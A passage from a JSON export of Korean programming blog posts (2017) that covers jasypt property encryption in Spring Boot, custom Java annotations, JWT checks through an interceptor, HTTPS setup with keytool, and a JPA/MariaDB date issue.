데이터를 보내기 전 데이터 검증을 하는 로직도 응용하여 만들어 볼 수 있습니다.\n\n포스팅을 읽어주셔서 감사합니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-12-21) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Spring에서 설정파일을 감추고 싶다... Spring Framework를 이용하여 프로젝트를 진행할 때 데이터베이스 정보나 기타 민간함 정보를 설정파일에 작성하게 됩니다. 물론 Java Config를 …","fields":{"slug":"/spring_spring-boot/171221_jsaypt/"},"frontmatter":{"date":"December 21, 2017","title":"Spring에서 설정파일(properties) 암호화 하기 (with jasypt)","description":null,"tags":["Spring"],"series":"Spring_SpringBoot","previewImage":"springboot_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-12-21) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_spring.png)\n\n<br>\n\n# Spring에서 설정파일을 감추고 싶다...\n\nSpring Framework를 이용하여 프로젝트를 진행할 때 데이터베이스 정보나 기타 민간함 정보를 설정파일에 작성하게 됩니다.  \n물론 Java Config를 사용하게 된다면 상관 없지만, 저는 주로 application.yml(또는 application.properties)을(를) 사용합니다.\n\n문제는 이 설정파일의 경우 배포 시 노출이 되어 보안에 문제가 생길 수 있습니다. (물론 Java Config도 100% 안전한 것은 아니지만...)\n\n그래서 이런 고민을 해결해 줄 라이브러리를 하나 소개하려 합니다.\n\n<br>\n\n## Jsaypt(Java Simplified Encryption) 를 써보자\n\nJasypt는 위에서 언급했던 문제를 해결해주는 자바 라이브러리입니다.  \n좀 더 자세한 내용은 [Jasypt](http://www.jasypt.org/) 공식 문서를 확인해주세요.\n\n그럼 이제 **Jsaypt**를 사용하는 법에 대하여 알아보도록 하겠습니다.  \n이번 예제에 사용하는 Spring은 **Spring Boot 1.5.8.RELEASE** 이고, **gradle**을 사용합니다.\n\n<br>\n\n### 1. Jsaypt를 gradle에 추가하기\n\nSpring boot에서 jasypt를 사용하기 위해서는 아래의 의존성을 gradle을 추가해줍니다.\n\n#### 1.1 spring-boot-starter 용\n\n```gradle\ncompile \"com.github.ulisesbocchio:jasypt-spring-boot-starter:1.17\"\n```\n\n<br>\n\n#### 1.2 @SpringBootApplication 또는 @EnableAutoConfiguration 를 사용하지 않는 경우\n\n```gradle\ncompile \"com.github.ulisesbocchio:jasypt-spring-boot:1.17\"\n```\n\n1.2 항목에서는 위 gradle을 추가한 이후 **Configuration**클래스에 **@EnableEncryptableProperties**를 추가해줍니다.\n\n> 좀 더 자세한 내용은 [ulisesbocchio Github](https://github.com/ulisesbocchio/jasypt-spring-boot)를 참고하세요.\n\n<br>\n\n### 2. Config 클래스 작성\n\n```java\n@Configuration\npublic class JasyptConfig {\n\n    @Bean(\"jasyptStringEncryptor\")\n    public StringEncryptor stringEncryptor() {\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        SimpleStringPBEConfig config = new SimpleStringPBEConfig();\n        config.setPassword(\"test\"); //암호화에 사용할 키 -> 중요\n        config.setAlgorithm(\"PBEWithMD5AndDES\"); //사용할 알고리즘\n        config.setKeyObtentionIterations(\"1000\");\n        config.setPoolSize(\"1\");\n        config.setProviderName(\"SunJCE\");\n        config.setSaltGeneratorClassName(\"org.jasypt.salt.RandomSaltGenerator\");\n        config.setStringOutputType(\"base64\");\n        encryptor.setConfig(config);\n        return encryptor;\n    }\n}\n```\n\n설정 클래스를 하나 만들고 위와 같이 작성을 하여 **jasyptStringEncryptor** 빈을 만들어줍니다.\n\n<br>\n\n### 3. 설정파일에 추가 [application.yml(또는 application.properties)]\n\n```yml\njasypt:\n  encryptor:\n    bean: jasyptStringEncryptor\n```\n\n설정파일에 위 항목을 추가해줍니다.\nbean에는 2번에서 작성한 bean의 이름을 작성합니다.\n\n<br>\n\n### 4. 암호화 할 내용을 작성\n\n이제 암호화 할 데이터를 암호화 해야 합니다.  \n다양한 방법이 있지만 일단 간편하게 빠르게 쓰기 위해서 **Application**에 **CommandLineRunner**를 활용하는 방법을 사용하겠습니다.\n\n> [jasypt](http://www.jasypt.org/download.html)에서 다운로드 후 java로 직접 실행하는 방법도 있습니다.\n\n```java\n....(다른 설정 어노테이션)\n@SpringBootApplication\npublic class Application implements CommandLineRunner {\n\n\tpublic static void main(String [] args) {\n        SpringApplication.run(Application.class, args);\n        System.out.println(\"=========== Server Start ===========\");\n\t}\n\n\t@Override\n   public void run(String... args) throws Exception {\n\t\tStandardPBEStringEncryptor pbeEnc = new StandardPBEStringEncryptor();\n\t\tpbeEnc.setAlgorithm(\"PBEWithMD5AndDES\");\n\t\tpbeEnc.setPassword(\"test\"); //2번 설정의 암호화 키를 입력\n\n\t\tString enc = pbeEnc.encrypt(\"1234\"); //암호화 할 내용\n\t\tSystem.out.println(\"enc = \" + enc); //암호화 한 내용을 출력\n\n\t\t//테스트용 복호화\n\t\tString des = pbeEnc.decrypt(enc);\n\t\tSystem.out.println(\"des = \" + des);\n   }\n}\n```\n\n위와 같이 진행할 경우 암호화 한다면 **ENC(fncHYmDe1oSFNFV8FcAEDa==)** 와 같은 값이 나오고 복호화 시 **1234**가 정상적으로 출력됩니다.\n\n이렇게 암호화 할 내용을 만든 후 다음과 같이 설정파일에 작성을 해줍니다.\n\n```yml\nspring:\n  datasource:\n    sql-script-encoding: UTF-8\n    driver-class-name: org.mariadb.jdbc.Driver\n    url: ENC(fAcHYhDi1oSaAF8FcAEDQ==)\n    username: ENC(fncHYmDe8oSFAFV8FcAEDQ==)\n    password: ENC(Aqh1BctIkm9uBNolQ5xlSg==)\n```\n\n그리고 다시 서버를 실행해보면 정상적으로 실행됩니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-12-14) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 19년 9월 8일 추가 19년 9월 8일 Github에 해당 소스를 등록하였다.\nGithub의 이곳을 참고하면 된다. 커스텀 어노테이션을 만들어 보자. Java에서 어노테이션(Annotation)이란?\n포스…","fields":{"slug":"/java/171214_java-custom-anotation-01/"},"frontmatter":{"date":"December 14, 2017","title":"Java에서 커스텀 어노테이션(Annotation) 만들고 사용하기","description":null,"tags":["Java"],"series":"Java","previewImage":"java_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-12-14) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# 19년 9월 8일 추가\n\n> 19년 9월 8일 Github에 해당 소스를 등록하였다.\n> [Github](https://github.com/elfinlas/JavaBlogCode)의 [이곳](https://github.com/elfinlas/JavaBlogCode/tree/master/src/com/mhlab/custom_anno)을 참고하면 된다.\n\n<br>\n\n# 커스텀 어노테이션을 만들어 보자.\n\n[Java에서 어노테이션(Annotation)이란?](https://elfinlas.github.io/java/171214_java-annotation)\n포스팅에서 어노테이션에 대해 간단히 알아보았습니다.\n\n이번 포스팅에서는 직접 커스텀 어노테이션을 작성하는 방법에 대하여 알아보도록 하겠습니다.  \n두 가지의 예제를 통해 알아보도록 하겠습니다.\n\n<br>\n\n## 1. 정수 값 주입 예제\n\n처음 주제는 어노테이션을 선언한 정수형 변수에 값을 넣는 예제를 진행해보겠습니다.\n\n> 간단한 예제 이므로 주석은 달지 않거나 간단한 설명으로 대체하겠습니다.\n\n### 1. 어노테이션 인터페이스 작성\n\n```java\n@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface InsertIntData {\n    int data() default 0;\n}\n```\n\n인터페이스를 만들어주는데 앞에 **@** 표시를 붙이면 됩니다.  \n1번과 2번에 대한 설명은 [어노테이션](https://elfinlas.github.io/java/171214_java-annotation) 포스팅에서 정리하였습니다.  \n일단 멤버 변수에 **data**라는 주입을 받을 값을 만들어 줍니다.\n\n### 2. 어노테이션을 사용할 예제 클래스 작성\n\n```java\npublic class AnnotationExam01 {\n    @InsertIntData(data = 30)\n    private int myAge;\n\n    @InsertIntData\n    private int defaultAge;\n\n    public AnnotationExam01() {\n        this.myAge = -1;\n        this.defaultAge = -1;\n    }\n\n    public int getMyAge() {\n        return myAge;\n    }\n\n    public int getDefaultAge() {\n        return defaultAge;\n    }\n}\n}\n```\n\n변수는 다음과 같이 **myAge**와 **defaultAge** 두 가지인데 **myAge**에 어노테이션에서는 30으로 값을 주입합니다.  \n하지만 **defaultAge** 에서는 값이 없는데 이 경우 어노테이션에서 정한 기본 값인 0으로 값이 주입이 됩니다.  \n생성자의 경우 값이 없을 경우 -1을 기본으로 저장합니다.\n\n다음은 두 번째 예제인 문자열 값 주입을 보도록 하겠습니다.  \n두 번째 예제에서는 수행 클래스 및 실행 클래스까지 알아보겠습니다.\n\n<br>\n\n## 2. 문자열 값 주입 예제\n\n두 번째 주제는 어노테이션을 선언한 정수형 변수에 값을 넣는 예제를 진행해보겠습니다.\n\n> 간단한 예제 이므로 주석은 달지 않거나 간단한 설명으로 대체하겠습니다.\n\n### 1. 어노테이션 인터페이스 작성\n\n````java\n@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface InsertStringData {\n    String data() default \"default\";\n}```\n\n위의 1-1와 비슷합니다.\n기본 값으로는 **default** 문자열을 가집니다.\n\n\n### 2. 어노테이션을 사용할 예제 클래스 작성\n\n```java\npublic class AnnotationExam02 {\n\n    @InsertStringData(data = \"MHLab\")\n    private String myData;\n\n    @InsertStringData\n    private String defaultData;\n\n    public AnnotationExam02() {\n        myData = \"No data\";\n        defaultData = \"No data\";\n    }\n\n    public String getMyData() {\n        return myData;\n    }\n\n    public String getDefaultData() {\n        return defaultData;\n    }\n}\n````\n\n변수는 다음과 같이 **myData**와 **defaultData** 두 가지인데 **myData**에 어노테이션에서는 \"MHLab\"으로 값을 주입합니다.  \n하지만 **defaultData** 에서는 값이 없는데 이 경우 어노테이션에서 정한 기본 값인 \"default\"로 값이 주입이 됩니다.  \n생성자의 경우 값이 없을 경우 \"No data\" 문자열을 기본으로 저장합니다.\n\n### 3. 어노테이션을 수행하는 클래스 작성\n\n```java\npublic class AnnotationHandler {\n    private <T> T checkAnnotation(T targetObj, Class annotationObj) {\n        Field[] fields = targetObj.getClass().getDeclaredFields();\n        for (Field f : fields) {\n            if(annotationObj == InsertIntData.class) {\n                return checkAnnotation4InsertInt(targetObj, f);\n            }\n            else if(annotationObj == InsertStringData.class) {\n                return checkAnnotation4InsertString(targetObj, f);\n            }\n        }\n        return targetObj;\n    }\n\n    private <T> T checkAnnotation4InsertInt(T targetObj, Field field) {\n        InsertIntData annotation = field.getAnnotation(InsertIntData.class);\n        if(annotation != null && field.getType() == int.class) {\n            field.setAccessible(true);\n            try {  field.set(targetObj, annotation.data()); }\n            catch (IllegalAccessException e) { System.out.println(e.getMessage()); }\n        }\n        return targetObj;\n    }\n\n    private <T> T checkAnnotation4InsertString(T targetObj, Field field) {\n        InsertStringData annotation = field.getAnnotation(InsertStringData.class);\n        if(annotation != null && field.getType() == String.class) {\n            field.setAccessible(true);\n            try { field.set(targetObj, annotation.data()); }\n            catch (IllegalAccessException e) { System.out.println(e.getMessage()); }\n        }\n        return targetObj;\n    }\n\n    public <T> Optional<T> getInstance(Class targetClass, Class annotationClass) {\n        Optional optional = Optional.empty();\n        Object object;\n        try {\n            object = targetClass.newInstance();\n            object = checkAnnotation(object, annotationClass);\n            optional = Optional.of(object);\n        }catch (InstantiationException | IllegalAccessException e) { System.out.println(e.getMessage()); }\n        return optional;\n    }\n}\n```\n\n약간 코드가 복잡한데 하나씩 설명드리겠습니다.  \n(코드 리펙토링이 필요하지만 예제를 위한 코드이기에 그냥 진행하겠습니다.)\n\n#### getInstance 메서드\n\n이 메서드는 두 가지의 전달인자를 받습니다.  \n첫 번째는 어노테이션이 적용되어 있는 2번에서 작성한 클래스, 두 번째는 체크할 어노테이션 클래스입니다.  \n반환 값은 **Optional**을 사용하여 반환하게 됩니다.  \n먼저 타겟 클래스의 인스턴스를 생성하고, **checkAnnotation** 메서드를 호출합니다.  \n여기서 전달인자에 어노테이션 클래스를 넣은 것은 향후 확장성을 고려 하였는데, 이 부분은 기호에 알맞게 메서드를 나눠서 구현을 해도 무방합니다.\n\n#### checkAnnotation 메서드\n\n이 메서드는 앞선 **getInstance** 메서드의 전달인자를 그대로 받습니다.  \n**fields** 변수는 타겟 객체에 선언된 것들을 모두 가져옵니다.  \n(**Field**는 리플렉션과 관련되어 있고, 이는 다음 포스팅에서 다루겠습니다.)  \n그 다음 전달인자 **annotationObj** 값에 따라 분기를 나눠 메서드를 호출하게 됩니다.\n\n#### checkAnnotation4InsertInt 메서드 (checkAnnotation4InsertString 메서드도 동작이 비슷하게 여기 설명으로 대체합니다.)\n\n해당 메서드는 한 라인씩 간략하게 짚고 넘어가겠습니다\n\n`InsertIntData annotation = field.getAnnotation(InsertIntData.class);`  \n이 부분은 전달인자로 받은 Field에서 선언된 어노테이션을 가져옵니다.\n\n`if(annotation != null && field.getType() == int.class)`  \n이 부분은 어노테이션이 **null**이 아니거나 선언된 변수의 타입이 int형일 경우에만 수행을 하게 됩니다.\n\n`field.setAccessible(true);`  \n일반적으로 private로 선언된 변수(필드)의 경우 접근이 불가능하지만, 리플렉트를 통한 접근에 한하여 가능하게끔 해준다.\n\n`try { field.set(targetObj, annotation.data()); }`  \n해당 변수의 값을 어노테이션의 값으로 치환하게 됩니다.\n\n위와 같은 작업을 거치고 난 후 전달인자로 넘어온 어노테이션이 선언된 클래스 객체를 반환하게 됩니다.\n\n<br>\n\n## 4. 실행 클래스 작성\n\n아래는 위의 두 가지 예제의 실행코드를 작성하였습니다.\n\n```java\npublic static void main(String[] args) {\n        AnnotationHandler handler = new AnnotationHandler();\n        AnnotationExam01 exam01 = handler.getInstance(AnnotationExam01.class, InsertIntData.class)\n                .map(o -> (AnnotationExam01)o)\n                .orElse(new AnnotationExam01());\n\n        AnnotationExam02 exam02 = handler.getInstance(AnnotationExam02.class, InsertStringData.class)\n                .map(o -> (AnnotationExam02)o)\n                .orElse(new AnnotationExam02());\n\n        System.out.println(\"myAge = \" + exam01.getMyAge());\n        System.out.println(\"defaultAge = \" + exam01.getDefaultAge());\n\n        System.out.println(\"myData = \" + exam02.getMyData());\n        System.out.println(\"defaultData = \" + exam02.getDefaultData());\n    }\n```\n\n실행결과는 다음과 같이 출력됩니다.\n\n> myAge = 30  \n> defaultAge = -1  \n> myData = MHLab  \n> defaultData = No data  \n> Process finished with exit code 0\n\n<br>\n\n# 정리\n\n뭔가 글이 복잡하고 장황하게 쓴 것 같지만...최대한 내용을 쉽게 풀어서 작성하였습니다.  \n잘못되었거나 문제가 있는 부분은 알려주시면 수정하도록 하겠습니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-12-14) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  커스텀 어노테이션의 활용 제가 진행하는 프로젝트에서는 안드로이드와 Spring Boot 서버의 서로 통신을 진행하면서 Jwt를 이용하여 사용자 인증을 진행하였습니다. 이번 포스팅에서는 Jwt인증에 대한 부…","fields":{"slug":"/til/171214_devnote/"},"frontmatter":{"date":"December 14, 2017","title":"12월 14일 연구일지 (Spring boot에서 커스텀 어노테이션을 활용한 Jwt 검증)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-12-14) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n# 커스텀 어노테이션의 활용\n\n제가 진행하는 프로젝트에서는 안드로이드와 Spring Boot 서버의 서로 통신을 진행하면서 Jwt를 이용하여 사용자 인증을 진행하였습니다.  \n이번 포스팅에서는 Jwt인증에 대한 부분 보다는,  \n커스텀 어노테이션을 왜 쓰게 되었는지와 더불어 어떤식으로 커스텀 어노테이션을 활용하였는지에 대해 작성하도록 하겠습니다.\n\n<br>\n\n## 왜 커스텀 어노테이션을 쓰게 되었는가?\n\n서버와 모바일에서 사용자 인증은 jwt를 활용하고 있습니다.  \n컨트롤러에 진입할 때 Header에 있는 jwt를 받아서 해당 jwt를 검증하는 방식을 사용하고 있습니다.  \n처음에는 로직을 너무 복잡하게 짰습니다.\n\n초창기에 개발된 일부 코드를 보도록 하겠습니다.\n\n```Java\nreturn isProblemJsonResultCode(securityService.veryfiyHeaderInJwt(request))\n                .orElseGet(() -> {...})\n```\n\n위의 작은 코드에서만 봐도 jwt를 검증하는 로직 자체도 불분명하고, 람다식을 잘못 쓴 것도 보이네요.  \n컨트롤러에 진입할 때마다 저런식으로 작업을 하게 된다면 코드가 정말 지저분해질 것으로도 예상되네요. (실제로도 그랬습니다...)\n\n그래서 이 부분을 어떻게 개선을 할까 하다가 인터셉터를 활용하기로 하였습니다.  \n특정 url에 접근하게 된다면 인터셉터에서 처리하는 방식을 사용하는 것을 생각하였습니다.  \n그런데 이 부분에서는 아래와 같은 고민거리에 대해 생각하게 되었습니다.\n\n1. 특정 Rest api 호출 시에는 jwt 검증이 필요하지 않다.\n2. 서버가 Rest api only가 아니라서 몇 가지 다른 url 호출도 같이 쓰게 됨\n\n1번의 경우 검증을 안하는 api가 적은 숫자는 아니라서 **excludePathPatterns** 을 일일히 적용하기엔 인터셉터가 길어질 것 같았습니다.  \n2번의 경우 기존에 개발이 된 서버에 Rest api를 붙이는 방식이어서(사실 설계측도 잘못되어 있지만..) url 앞 부분이 겹치는 문제도 있었습니다.\n\n그래서 이 부분을 해결하게 된 것이 **커스텀 어노테이션**이었습니다.  \n컨트롤러에서 jwt 검증을 진행해야 하는 부분에는 **@CheckJwt** 와 같은 어노테이션을 붙여서 구분을 하게 하는 방식을 생각하였습니다.\n\n<br>\n\n## 어떤 식으로 활용을 하였는가?\n\n일단 어노테이션과 커스텀 어노테이션에 대한 이해가 있다는 가정하에 진행하겠습니다.\n\n> 만약 두 가지에 대해 모르신다면 아래의 포스팅을 참고해주세요.  \n> [Java에서 어노테이션(Annotation)이란?](https://elfinlas.github.io/java/171214_java-annotation/) > [커스텀 어노테이션 만들고 사용하기](https://elfinlas.github.io/java/171214_java-custom-anotation-01/)\n\n1. 인터셉터를 하나 만든다.\n\n먼저 인터셉터를 하나 만들어줍니다.\n\n```java\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface CheckJwt {\n    boolean needCheck() default true; //체크가 필요한 경우의 여부 (기본 값 : 검사)\n}\n```\n\n이런식으로 만들어줍니다.\n\n<br>\n\n2. 선언된 인터셉에서 어노테이션 처리를 진행\n\n저같은 경우 컨트롤러 진입하기 전에 jwt 검증을 처리하기 위해서 **preHandle**에서 처리를 진행하였습니다.\n\n```java\nHandlerMethod method = (HandlerMethod)handler;\nCheckJwt checkJwt = method.getMethodAnnotation(CheckJwt.class);\n\nif (checkJwt == null || checkJwt.needCheck()==false) { return true; }//검사를 할 필요가 없는 부분\nelse { //세션 체크 검사\n\treturn Optional.ofNullable(request.getHeader(HttpHeaders.AUTHORIZATION))\n                    .map(token -> jwtService.veryfiyJwt_new(token))\n                    .orElseThrow(JwtNotFoundException::new); //토큰이 존재하지 않는 경우\n}\n```\n\n**preHandle**의 전달인자 중 **handler** 파라메터는 인터셉터에서 핸들러 매핑이 찾아 준 컨트롤러의 객체를 반환합니다.  \n그래서 첫번 째 줄에서 **method**에는 호출된 컨트롤러의 객체가 담겨져 있고, 두번째 줄에서 **@CheckJwt** 어노테이션을 찾습니다.  \n만약 **@checkJwt**가 선언이 안되어 있거나 needCheck가 false일 경우 검사를 진행하지 않고, 그 외에는 검사를 진행하게 됩니다.\n\n<br>\n\n3. 선언 및 사용\n\n이제 **@CheckJwt**는 아래와 같이 사용하게 될 수 있습니다.\n\n```java\n@CheckJwt\n@ResponseBody\n@GetMapping(\"list/{hour}/{level}\")\npublic JsonResultVo getMachineWarning(HttpServletRequest request, @PathVariable(\"hour\") String hour, @PathVariable(\"level\") String level) { ... }\n```\n\n## 정리\n\n자바의 커스텀 어노테이션을 활용한다면 정말 효과적인 코드 리펙토링을 진행할 수 있을 뿐더러, 코드의 이해도가 향상되는 것 같습니다.  \n다음에는 jwt에 대한 것에 대하여 알아보는 포스팅을 작성해보도록 하겠습니다.\n\n감사합니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-29) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Spring Boot에서 HTTPS를 적용하려면? Spring Boot환경에서 HTTP 통신으로 프로젝트를 구현하고 있었습니다. 하지만 보안적인 부분에 문제가 있어서 이 부분을 해결하기 위해 다양한 방법을…","fields":{"slug":"/spring_spring-boot/171229_springboot-https/"},"frontmatter":{"date":"November 29, 2017","title":"Spring Boot에서 HTTPS 적용하기","description":null,"tags":["Spring Boot"],"series":"Spring_SpringBoot","previewImage":"springboot_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-29) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_spring.png)\n\n<br>\n\n# Spring Boot에서 HTTPS를 적용하려면?\n\nSpring Boot환경에서 HTTP 통신으로 프로젝트를 구현하고 있었습니다.\n\n하지만 보안적인 부분에 문제가 있어서 이 부분을 해결하기 위해 다양한 방법을 찾아봤습니다.\n\nRSA로 암호화를 하는 방법을 주로 사용했었습니다.\n\n하지만 이렇게 하는 것보다 그냥 HTTPS를 사용하여 처리하는 것이 좋을 것 같아서 이 부분에 대해 적용을 해보았고, 경험을 포스팅하려 합니다.\n\n진행에 앞서 개발환경은 **Mac OS X**이고, **Java**가 설치되어 있는 환경에서 진행됩니다.\n\n<br>\n\n## 어떻게 진행을 해야 하는가?\n\n먼저 다음의 스텝으로 진행을 합니다.\n\n**1. 키스토어 생성**  \n**2. 인증서 추출**  \n**3. Trust-Store 생성**  \n**4. Spring boot 환경 구성**\n\n위 순서대로 하나씩 진행을 해보겠습니다.\n\n<br>\n\n### Key Store 생성하기\n\n먼저 **Key Store**를 생성해줘야 합니다.\n\n터미널을 열고 다음과 같이 명령어를 사용합니다.\n\n```\n> keytool -genkey -alias (키스토어의 별칭) -keyalg RSA -keystore (생성할 키스토어의 파일명).jks\n```\n\n별칭은 KeyStore의 닉네임 같은 것이라 보면 되고, 이름은 KeyStore의 파일 명입니다.\n\n![](./images/171229_springboot-https/keystore.png)\n\n실행을 하면 다음과 같이 KeyStore 정보를 입력하게 되고 생성이 완료됩니다.\n\n> KeyStore란?  \n> KeyStore는 비밀키, 관련된 인증서 혹은 인증서 체인을 가지고 있는 데이타베이스입니다.  \n> 인증서 체인은 클라이언트 인증서와 하나 이상의 CA 인증서(공인인증서)로 구성됩니다.  \n> 보통 서버 역할을 하는 측에서만 필요하지만, 클라이언트 인증을 요구하는 경우 클라이언트 쪽도 있어야 합니다.\n\n<br>\n\n### 인증서 추출하기\n\nTrust-Store를 생성하기 위해서는 1번에서 생성한 Key-Store에서 인증서를 추출해야 합니다.\n\n아래의 명령어를 통해 인증서를 추출합니다.\n\n```\n> keytool -export -alias (키스토어의 별칭) -keystore (키스토어의 파일명) -rfc -file (생성할 인증서 파일이름).cer\n```\n\n<br>\n\n### Trust-Store 생성하기\n\n위에서 생성한 인증서를 통해서 Trust Store를 생성합니다.\n\n```\n> keytool -import -alias (Trust-Store의 별칭) -file (인증서 파일명) -keystore (생성할 Trust-Store 파일명).ts\n```\n\n<br>\n\n> Trust Store란?  \n> TrustStore는 클라이언트가 신뢰할 수 있는 인증서만을 가지고 있습니다.  \n> 이들 인증서는 CA 루트 인증서 즉 자기서명 인증서입니다.  \n> 보통 웹서버가 설치되면 cacerts.jks라는 파일명으로 이 TrustStore가 저장됩니다.\n\n<br>\n\n### Spring boot 환경 구성하기\n\n위에서 생성한 KeyStore, Trust-Store를 통해서 이제 Spring boot에서 SSL 구성을 해보도록 하겠습니다.\n\n먼저 Spring boot에서 환경설정을 엽니다.\n\n**application.properties**를 많이 사용하지만 저는 **application.yml**을 사용하기에 여기에 맞춰서 설명하겠습니다. (사실 둘다 비슷해서..)\n\n```yml\nserver:\n  port: 8090 #Https port\n  ssl:\n    enabled: true\n    key-store: /home/test/mhlab_keystore.jks # 1번에서 생성한 Key store 경로와 파일명을 적어줍니다.\n    key-store-password: passwd # 1번에서 생성한 Key store의 비밀번호를 적어줍니다.\n    key-password: passwd # 1번에서 생성한 키스토어의 마지막의 키 비밀번호\n    key-alias: mhlab # 키 스토어 별칭\n    trust-store: /home/test/mhlab_keystore.ts # 2번에서 생성한 Trust-Store 경로\n    trust-store-password: passwd # Trust-Store 비밀번호\n```\n\n위와같이 구성 후 서버를 구동하고 브라우저에서 접속을 해봅니다. (크롬 브라우저 기준)\n\n![](/img01.png)\n\n위와 같이 뜨는 이유는 생성한 인증서가 공식적으로 인증받지 않은 인증서이기 때문입니다.\n\n이 부분은 향후 다시 포스팅 하기로 하고... 하단의 고급 버튼을 클릭하면...\n\n![](/img02.png)\n\n이렇게 세부정보가 나오고 하단의 **localhost(안전하지 않음)** 을 클릭하면 페이지가 이동됩니다.\n\n![](/img03.png)\n\n그리고 접속한 주소를 확인해보면 위와 같이 **https**로 표시됩니다.\n\n<br>\n\n## 결론\n\n사실 지금까지 해본 플로우로 적용하는 것 자체는 쉬운 편입니다.(?)\n\n하지만 저기에서 쓰인 SSL이나 인증서, Keystore, Trust-Store 및 Java의 Keytool 등에 대한 것에 대한 이해는 쉬운 편은 아니라 생각합니다.\n\n다음 포스팅에서는 위와 같은 이론적인 측면을 포스팅해보도록 하겠습니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-27) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  삽질만 6시간...실화임? 지금 생각해보면 하도 어이가 없어서 이 포스팅을 쓰기도 부끄럽습니다만... (제 무지의 깊이가 상당히 깊다는 것도...반성의 의미로 작성하는 글) 오늘 봉착한 문제는 이것입니다.…","fields":{"slug":"/til/171127_devnote/"},"frontmatter":{"date":"November 27, 2017","title":"11월 27일 개발일지 (Jpa와 MariaDb, 그리고 LocalDateTime)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-27) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n# 삽질만 6시간...실화임?\n\n지금 생각해보면 하도 어이가 없어서 이 포스팅을 쓰기도 부끄럽습니다만...\n\n(제 무지의 깊이가 상당히 깊다는 것도...반성의 의미로 작성하는 글)\n\n오늘 봉착한 문제는 이것입니다.\n\n> 데이터베이스에 값이 정상적으로 등록이 되지 않는 문제\n\n이렇게 보니 정말 심플한 문제로 보일 것입니다.\n\n좀 더 자세하게 들어가서 보자면...\n\nSpring Boot 프로젝트의 Jpa를 사용하여 데이터베이스에 값을 넣는데 계속 문제가 발생하였습니다.\n\n이렇게만 봐도 설정을 잘못했거나 미숙한 초보의 실수(물론 초보의 실수..)라 보이겠지만...\n\n오늘의 실수와 교훈에 대해 시작하겠습니다.\n\n<br>\n\n## 문제와 원인 그리고...\n\n문제의 DB 테이블은 다음과 같습니다.\n\n```sql\nCREATE TABLE `account` (\n  `idx` int(11) unsigned NOT NULL AUTO_INCREMENT,\n  `id` varchar(60) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '',\n  `pw` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,\n  `create_date` timestamp NOT NULL,\n  `email` varchar(60) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '',\n  `phone` varchar(20) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '',\n  `type` varchar(60) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '',\n  `group` varchar(60) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '',\n  `update_date` timestamp NOT NULL,\n  PRIMARY KEY (`idx`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;\n```\n\n그리고 **Entity**객체는 다음과 같이 구성되어 있습니다.\n\n```java\n@Entity\n@ToString\n@Accessors(chain = true)\n@Getter @Setter\npublic class Account {\n    @Id\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    private int idx;\n\n    private String id;\n\n    private String pw;\n\n    private LocalDateTime createDate;\n\n    private String email;\n\n    private String phone;\n\n    private String userType;\n\n    private String userGroup;\n\n    private LocalDateTime updateDate;\n}\n```\n\n그리고 jpa에서 데이터가 추가되는 로직은 아래와 같습니다.\n\n```java\naccountRepo.save(\n                new Account()\n                        .setId(\"admin\")\n                        .setPw(shaSecurityService.encryptData4SHA(\"admin\"))\n                        .setCreateDate(LocalDateTime.now())\n                        .setEmail(\"admin@admin.com\")\n                        .setPhone(\"000-000-0000\")\n                        .setUserType(\"admin\")\n                        